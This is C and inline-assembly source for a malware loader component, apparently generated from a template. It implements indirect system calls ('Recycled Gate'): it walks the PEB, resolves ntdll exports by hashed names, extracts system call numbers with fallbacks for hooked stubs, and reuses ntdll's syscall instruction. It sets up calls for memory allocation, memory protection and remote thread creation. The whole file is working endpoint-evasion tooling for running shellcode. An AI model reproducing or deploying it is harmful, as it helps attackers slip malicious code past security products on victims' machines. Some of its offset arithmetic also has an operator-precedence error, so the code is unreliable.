// --- Helper Functions ---
unsigned long rg_djb2(unsigned char* str) {
    unsigned long hash = 5381;
    int c;
    while ((c = *str++))
        hash = ((hash << 5) + hash) + c;
    return hash;
}

unsigned long rg_xor_hash(unsigned long hash) {
    return hash ^ HASH_KEY;
}

PVOID rg_findNtDll(void) {
    PRG_PEB pPeb = (PRG_PEB)__readgsqword(0x60);
    PRG_PEB_LDR_DATA pLdrData = pPeb->Ldr;
    PLIST_ENTRY listHead = &pLdrData->InMemoryOrderModuleList;
    PLIST_ENTRY currentEntry = listHead->Flink;

    DWORD target_hash = rg_xor_hash({{ hash_ntdll_dll }}); 

    while (currentEntry != listHead) {
        PRG_LDR_DATA_TABLE_ENTRY pModuleEntry = (PRG_LDR_DATA_TABLE_ENTRY)((PBYTE)currentEntry - offsetof(RG_LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks));

        if (pModuleEntry->BaseDllName.Buffer) {
            unsigned long hash = 5381;
            WCHAR* str = pModuleEntry->BaseDllName.Buffer;
            while (*str) {
                wchar_t c = *str;
                // Convert to uppercase to match Python's hash_ntdll_dll ("NTDLL.DLL")
                if (c >= L'a' && c <= L'z') c -= 32;
                hash = ((hash << 5) + hash) + c;
                str++;
            }
            
            if (rg_xor_hash(hash) == target_hash) {
                return pModuleEntry->DllBase;
            }
        }
        currentEntry = currentEntry->Flink;
    }
    
    DEBUG_PRINT("rg_findNtDll: Failed to find NTDLL.DLL!");
    return NULL;
}

DWORD getSyscall(DWORD dwCryptedHash, PSYSCALL_ENTRY pSyscall) {
    PVOID pNtdllBase = rg_findNtDll();
    if (!pNtdllBase) return 0;

    PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)pNtdllBase;
    PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)((PBYTE)pNtdllBase + pDosHdr->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pNtdllBase + pNtHdrs->OptionalHeader.DataDirectory[0].VirtualAddress);

    PDWORD pdwAddrOfFunctions = (PDWORD)((PBYTE)pNtdllBase + pExportDir->AddressOfFunctions);
    PDWORD pdwAddrOfNames = (PDWORD)((PBYTE)pNtdllBase + pExportDir->AddressOfNames);
    PWORD pwAddrOfNameOrdinales = (PWORD)((PBYTE)pNtdllBase + pExportDir->AddressOfNameOrdinals);

    PVOID pStub = NULL;
    PVOID pGate = NULL;
    DWORD dwSyscallNr = 0;
    
    // Find the function by hash
    for (DWORD i = 0; i < pExportDir->NumberOfNames; i++) {
        char* funcName = (char*)((PBYTE)pNtdllBase + pdwAddrOfNames[i]);
        if (rg_djb2((unsigned char*)funcName) == rg_xor_hash(dwCryptedHash)) {
            pStub = (PVOID)((PBYTE)pNtdllBase + pdwAddrOfFunctions[pwAddrOfNameOrdinales[i]]);
            break;
        }
    }

    if (!pStub) {
        DEBUG_PRINT("getSyscall: Failed to find function with hash 0x%X in NTDLL exports", dwCryptedHash);
        return 0;
    }

    for (int i = 0; i < SYS_STUB_SIZE; i++) {
        if (*((PBYTE)pStub + i) == 0x4c && *((PBYTE)pStub + i + 1) == 0x8b && 
            *((PBYTE)pStub + i + 2) == 0xd1 && *((PBYTE)pStub + i + 3) == 0xb8 &&
            *((PBYTE)pStub + i + 6) == 0x00 && *((PBYTE)pStub + i + 7) == 0x00) { // mov r10, rcx; mov eax, imm32; ...
            
            BYTE low = *((PBYTE)pStub + i + 4);
            BYTE high = *((PBYTE)pStub + i + 5);
            dwSyscallNr = (high << 8) | low;
            break;
        }
    }
    
    if (dwSyscallNr == 0) { // Fallback for different stub structures
         for (int idx = 1; idx <= 32; idx++) { // Check for stubs like: mov r10, rcx; mov eax, imm16; ...
             PBYTE pNeighbor = (PBYTE)pStub + idx * 32;
             if (*((PBYTE)pNeighbor) == 0x4c && *((PBYTE)pNeighbor + 1) == 0x8b && 
                *((PBYTE)pNeighbor + 2) == 0xd1 && *((PBYTE)pNeighbor + 3) == 0xb8) { // mov r10, rcx; mov eax, imm16
                 BYTE low = *((PBYTE)pNeighbor + 4);
                 BYTE high = *((PBYTE)pNeighbor + 5);
                 dwSyscallNr = (high << 8) | low - idx; // Adjust syscall number based on offset
                 pStub = pNeighbor; 
                 break;
             }
         }
         if (dwSyscallNr == 0) { // Check for stubs with negative offsets
             for (int idx = 1; idx <= 32; idx++) {
                 PBYTE pNeighbor = (PBYTE)pStub - idx * 32;
                 if (*((PBYTE)pNeighbor) == 0x4c && *((PBYTE)pNeighbor + 1) == 0x8b && 
                    *((PBYTE)pNeighbor + 2) == 0xd1 && *((PBYTE)pNeighbor + 3) == 0xb8) { // mov r10, rcx; mov eax, imm16
                     BYTE low = *((PBYTE)pNeighbor + 4);
                     BYTE high = *((PBYTE)pNeighbor + 5);
                     dwSyscallNr = (high << 8) | low + idx; // Adjust syscall number based on offset
                     pStub = pNeighbor; 
                     break;
                 }
             }
         }
    }

    if (dwSyscallNr == 0) return 0;

    // Find the syscall instruction (0x0f 0x05) followed by ret (0xc3)
    for (int i = 0; i < SYS_STUB_SIZE; i++) {
        if (*((PBYTE)pStub + i) == 0x0f && *((PBYTE)pStub + i + 1) == 0x05 && *((PBYTE)pStub + i + 2) == 0xc3) {
            pGate = (PVOID)((PBYTE)pStub + i); // Point to the syscall instruction
            break;
        }
    }

    if (pGate) {
        pSyscall->dwSyscallNr = dwSyscallNr;
        pSyscall->pRecycledGate = pGate;
        return 1;
    }
    return 0;
}

// --- Assembly trampolines ---
__asm__( 
    ".text\n"
    ".global PrepareSyscall\n"
    "PrepareSyscall:\n"
    "    mov %rcx, %r11\n"
    "    mov %rdx, %r10\n"
    "    ret\n"
);

__asm__( 
    ".text\n"
    ".global DoSyscall\n"
    "DoSyscall:\n"
    "    push %r10\n" 
    "    xor %rax, %rax\n"
    "    mov %rcx, %r10\n" // Move first arg (rcx) to r10
    "    mov %r11d, %eax\n" // Move SSN from r11 to eax
    "    ret\n" // Returns to Gate (syscall; ret)
);

// Have to declare them for C
extern void PrepareSyscall(DWORD dwSycallNr, PVOID dw64Gate);
extern NTSTATUS DoSyscall(PVOID Arg1, ...); 

// --- Wrappers ---
SYSCALL_ENTRY g_NtAllocateVirtualMemory = {0};
SYSCALL_ENTRY g_NtProtectVirtualMemory = {0};
SYSCALL_ENTRY g_NtCreateThreadEx = {0};
SYSCALL_ENTRY g_NtWaitForSingleObject = {0};
